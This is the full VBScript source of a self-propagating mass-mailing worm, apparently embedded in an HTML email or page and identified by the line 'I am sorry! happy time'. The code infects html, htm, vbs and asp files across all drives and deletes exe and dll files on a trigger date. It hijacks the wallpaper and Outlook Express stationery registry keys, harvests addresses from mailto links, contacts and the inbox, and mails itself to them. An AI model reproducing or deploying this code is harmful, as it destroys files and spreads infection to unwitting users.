Rem I am sorry! happy time
On Error Resume Next
mload
Sub mload()
On Error Resume Next
mPath =3D Grf()
Set Os =3D CreateObject("Scriptlet.TypeLib")
Set Oh =3D CreateObject("Shell.Application")
If IsHTML Then
mURL =3D LCase(document.Location)
If mPath =3D "" Then
Os.Reset
Os.Path =3D "C:\Help.htm"
Os.Doc =3D Lhtml()
Os.Write()
Ihtml =3D "<span style=3D'position:absolute'><Iframe src=3D'C:\Help.htm' wi=
dth=3D'0' height=3D'0'></Iframe></span>"
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
Else
If Iv(mPath, "Help.vbs") Then
setInterval "Rt()", 10000
Else
m =3D "hta"
If LCase(m) =3D Right(mURL, Len(m)) Then
id =3D setTimeout("mclose()", 1)
main
Else
Os.Reset()
Os.Path =3D mPath & "\" & "Help.hta"
Os.Doc =3D Lhtml()
Os.write()
Iv mPath, "Help.hta"
End If
End If
End If
Else
main
End If
End Sub
Sub main()
On Error Resume Next
Set Of =3D CreateObject("Scripting.FileSystemObject")
Set Od =3D CreateObject("Scripting.Dictionary")
Od.Add "html", "1100"
Od.Add "vbs", "0100"
Od.Add "htm", "1100"
Od.Add "asp", "0010"
Ks =3D "HKEY_CURRENT_USER\Software\"
Ds =3D Grf()
Cs =3D Gsf()
If IsVbs Then
If Of.FileExists("C:\help.htm") Then
Of.DeleteFile ("C:\help.htm")
End If
Key =3D CInt(Month(Date) + Day(Date))
If Key =3D 13 Then
Od.RemoveAll
Od.Add "exe", "0001"
Od.Add "dll", "0001"
End If
Cn =3D Rg(Ks & "Help\Count")
If Cn =3D "" Then
Cn =3D 1
End If
Rw Ks & "Help\Count", Cn + 1
f1 =3D Rg(Ks & "Help\FileName")
f2 =3D FNext(Of, Od, f1)
fext =3D GetExt(Of, Od, f2)
Rw Ks & "Help\FileName", f2
If IsDel(fext) Then
f3 =3D f2
f2 =3D FNext(Of, Od, f2)
Rw Ks & "Help\FileName", f2
Of.DeleteFile f3
Else
If LCase(WScript.ScriptFullname) <> LCase(f2) Then
Fw Of, f2, fext
End If
End If
If (CInt(Cn) Mod 366) =3D 0 Then
If (CInt(Second(Time)) Mod 2) =3D 0 Then
Tsend
Else
adds =3D Og
Msend (adds)
End If
End If
wp =3D Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
If Rg(Ks & "Help\wallPaper") <> wp Or wp =3D "" Then
If wp =3D "" Then
n1 =3D ""
n3 =3D Cs & "\Help.htm"
Else
mP =3D Of.GetFile(wp).ParentFolder
n1 =3D Of.GetFileName(wp)
n2 =3D Of.GetBaseName(wp)
n3 =3D Cs & "\" & n2 & ".htm"
End If
Set pfc =3D Of.CreateTextFile(n3, True)
mt =3D Sa("1100")
pfc.Write "<" & "HTML><" & "body bgcolor=3D'#007f7f' background=3D'" & n1 &=
 "'><" & "/Body><" & "/HTML>" & mt
pfc.Close
Rw Ks & "Help\wallPaper", n3
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3
End If
Else
Set fc =3D Of.CreateTextFile(Ds & "\Help.vbs", True)
fc.Write Sa("0100")
fc.Close
bf =3D Cs & "\Untitled.htm"
Set fc2 =3D Of.CreateTextFile(bf, True)
fc2.Write Lhtml
fc2.Close
oeid =3D Rg("HKEY_CURRENT_USER\Identities\Default User ID")
oe =3D "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outloo=
k Express\5.0\Mail"
MSH =3D oe & "\Message Send HTML"
CUS =3D oe & "\Compose Use Stationery"
SN =3D oe & "\Stationery Name"
Rw MSH, 1
Rw CUS, 1
Rw SN, bf
Web =3D Cs & "\WEB"
Set gf =3D Of.GetFolder(Web).Files
Od.Add "htt", "1100"
For Each m In gf
fext =3D GetExt(Of, Od, m)
If fext <> "" Then
Fw Of, m, fext
End If
Next
End If
End Sub
Sub mclose()
document.Write "<" & "title>I am sorry!</title" & ">"
window.Close
End Sub
Sub Rt()
Dim mPath
On Error Resume Next
mPath =3D Grf()
Iv mPath, "Help.vbs"
End Sub
Function Sa(n)
Dim VBSText, m
VBSText =3D Lvbs()
If Mid(n, 3, 1) =3D 1 Then
m =3D "<%" & VBSText & "%>"
End If
If Mid(n, 2, 1) =3D 1 Then
m =3D VBSText
End If
If Mid(n, 1, 1) =3D 1 Then
m =3D Lscript(m)
End If
Sa =3D m & vbCrLf
End Function
Sub Fw(Of, S, n)
Dim fc, fc2, m, mmail, mt
On Error Resume Next
Set fc =3D Of.OpenTextFile(S, 1)
mt =3D fc.ReadAll
fc.Close
If Not Sc(mt) Then
mmail =3D Ml(mt)
mt =3D Sa(n)
Set fc2 =3D Of.OpenTextFile(S, 8)
fc2.Write mt
fc2.Close
Msend (mmail)
End If
End Sub
Function Sc(S)
mN =3D "Rem I am sorry! happy time"
If InStr(S, mN) > 0 Then
Sc =3D True
Else
Sc =3D False
End If
End Function
Function FNext(Of, Od, S)
Dim fpath, fname, fext, T, gf
On Error Resume Next
fname =3D ""
T =3D False
If Of.FileExists(S) Then
fpath =3D Of.GetFile(S).ParentFolder
fname =3D S
ElseIf Of.FolderExists(S) Then
fpath =3D S
T =3D True
Else
fpath =3D Dnext(Of, "")
End If
Do While True
Set gf =3D Of.GetFolder(fpath).Files
For Each m In gf
If T Then
If GetExt(Of, Od, m) <> "" Then
FNext =3D m
Exit Function
End If
ElseIf LCase(m) =3D LCase(fname) Or fname =3D "" Then
T =3D True
End If
Next
fpath =3D Pnext(Of, fpath)
Loop
End Function
Function Pnext(Of, S)
On Error Resume Next
Dim Ppath, Npath, gp, pn, T, m
T =3D False
If Of.FolderExists(S) Then
Set gp =3D Of.GetFolder(S).SubFolders
pn =3D gp.Count
If pn =3D 0 Then
Ppath =3D LCase(S)
Npath =3D LCase(Of.GetParentFolderName(S))
T =3D True
Else
Npath =3D LCase(S)
End If
Do While Not Er
For Each pn In Of.GetFolder(Npath).SubFolders
If T Then
If Ppath =3D LCase(pn) Then
T =3D False
End If
Else
Pnext =3D LCase(pn)
Exit Function
End If
Next
T =3D True
Ppath =3D LCase(Npath)
Npath =3D Of.GetParentFolderName(Npath)
If Of.GetFolder(Ppath).IsRootFolder Then
m =3D Of.GetDriveName(Ppath)
Pnext =3D Dnext(Of, m)
Exit Function
End If
Loop
End If
End Function
Function Dnext(Of, S)
Dim dc, n, d, T, m
On Error Resume Next
T =3D False
m =3D ""
Set dc =3D Of.Drives
For Each d In dc
If d.DriveType =3D 2 Or d.DriveType =3D 3 Then
If T Then
Dnext =3D d
Exit Function
Else
If LCase(S) =3D LCase(d) Then
T =3D True
End If
If m =3D "" Then
m =3D d
End If
End If
End If
Next
Dnext =3D m
End Function
Function GetExt(Of, Od, S)
Dim fext
On Error Resume Next
fext =3D LCase(Of.GetExtensionName(S))
GetExt =3D Od.Item(fext)
End Function
Sub Rw(k, v)
Dim R
On Error Resume Next
Set R =3D CreateObject("WScript.Shell")
R.RegWrite k, v
End Sub
Function Rg(v)
Dim R
On Error Resume Next
Set R =3D CreateObject("WScript.Shell")
Rg =3D R.RegRead(v)
End Function
Function IsVbs()
Dim ErrTest
On Error Resume Next
ErrTest =3D WScript.ScriptFullname
If Err Then
IsVbs =3D False
Else
IsVbs =3D True
End If
End Function
Function IsHTML()
Dim ErrTest
On Error Resume Next
ErrTest =3D document.Location
If Er Then
IsHTML =3D False
Else
IsHTML =3D True
End If
End Function
Function IsMail(S)
Dim m1, m2
IsMail =3D False
If InStr(S, vbCrLf) =3D 0 Then
m1 =3D InStr(S, "@")
m2 =3D InStr(S, ".")
If m1 <> 0 And m1 < m2 Then
IsMail =3D True
End If
End If
End Function
Function Lvbs()
Dim f, m, ws, Of
On Error Resume Next
If IsVbs Then
Set Of =3D CreateObject("Scripting.FileSystemObject")
Set f =3D Of.OpenTextFile(WScript.ScriptFullname, 1)
Lvbs =3D f.ReadAll
Else
For Each ws In document.scripts
If LCase(ws.Language) =3D "vbscript" Then
If Sc(ws.Text) Then
Lvbs =3D ws.Text
Exit Function
End If
End If
Next
End If
End Function
Function Iv(mPath, mName)
Dim Shell
On Error Resume Next
Set Shell =3D CreateObject("Shell.Application")
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
If Er Then
Iv =3D False
Else
Iv =3D True
End If
End Function
Function Grf()
Dim Shell, mPath
On Error Resume Next
Set Shell =3D CreateObject("Shell.Application")
mPath =3D "C:\"
For Each mShell In Shell.NameSpace(mPath).Items
If mShell.IsFolder Then
Grf =3D mShell.Path
Exit Function
End If
Next
If Er Then
Grf =3D ""
End If
End Function
Function Gsf()
Dim Of, m
On Error Resume Next
Set Of =3D CreateObject("Scripting.FileSystemObject")
m =3D Of.GetSpecialFolder(0)
If Er Then
Gsf =3D "C:\"
Else
Gsf =3D m
End If
End Function
Function Lhtml()
Lhtml =3D "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _
"<" & "/Body></HTML" & ">"
End Function
Function Lscript(S)
Lscript =3D "<" & "script language=3D'VBScript'>" & vbCrLf & _
S & "<" & "/script" & ">"
End Function
Function Sl(S1, S2, n)
Dim l1, l2, l3, i
l1 =3D Len(S1)
l2 =3D Len(S2)
i =3D InStr(S1, S2)
If i > 0 Then
l3 =3D i + l2 - 1
If n =3D 0 Then
Sl =3D Left(S1, i - 1)
ElseIf n =3D 1 Then
Sl =3D Right(S1, l1 - l3)
End If
Else
Sl =3D ""
End If
End Function
Function Ml(S)
Dim S1, S3, S2, T, adds, m
S1 =3D S
S3 =3D """"
adds =3D ""
S2 =3D S3 & "mailto" & ":"
T =3D True
Do While T
S1 =3D Sl(S1, S2, 1)
If S1 =3D "" Then
T =3D False
Else
m =3D Sl(S1, S3, 0)
If IsMail(m) Then
adds =3D adds & m & vbCrLf
End If
End If
Loop
Ml =3D Split(adds, vbCrLf)
End Function
Function Og()
Dim i, n, m(), Om, Oo
Set Oo =3D CreateObject("Outlook.Application")
Set Om =3D Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n =3D Om.Count
ReDim m(n)
For i =3D 1 To n
m(i - 1) =3D Om.Item(i).Email1Address
Next
Og =3D m
End Function
Sub Tsend()
Dim Od, MS, MM, a, m
Set Od =3D CreateObject("Scripting.Dictionary")
MConnect MS, MM
MM.FetchSorted =3D True
MM.Fetch
For i =3D 0 To MM.MsgCount - 1
MM.MsgIndex =3D i
a =3D MM.MsgOrigAddress
If Od.Item(a) =3D "" Then
Od.Item(a) =3D MM.MsgSubject
End If
Next
For Each m In Od.Keys
MM.Compose
MM.MsgSubject =3D "Fw: " & Od.Item(m)
MM.RecipAddress =3D m
MM.AttachmentPathName =3D Gsf & "\Untitled.htm"
MM.Send
Next
MS.SignOff
End Sub
Function MConnect(MS, MM)
Dim U
On Error Resume Next
Set MS =3D CreateObject("MSMAPI.MAPISession")
Set MM =3D CreateObject("MSMAPI.MAPIMessages")
U =3D Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\=
Profiles\DefaultProfile")
MS.UserName =3D U
MS.DownLoadMail =3D False
MS.NewSession =3D False
MS.LogonUI =3D True
MS.SignOn
MM.SessionID =3D MS.SessionID
End Function
Sub Msend(Address)
Dim MS, MM, i, a
MConnect MS, MM
i =3D 0
MM.Compose
For Each a In Address
If IsMail(a) Then
MM.RecipIndex =3D i
MM.RecipAddress =3D a
i =3D i + 1
End If
Next
MM.MsgSubject =3D " Help "
MM.AttachmentPathName =3D Gsf & "\Untitled.htm"
MM.Send
MS.SignOff
End Sub
Function Er()
If Err.Number =3D 0 Then
Er =3D False
Else
Err.Clear
Er =3D True
End If
End Function
Function IsDel(S)
If Mid(S, 4, 1) =3D 1 Then
IsDel =3D True
Else
IsDel =3D False
End If
End Function


</SCRIPT>

<br>

<!-- |**|begin egp html banner|**| -->
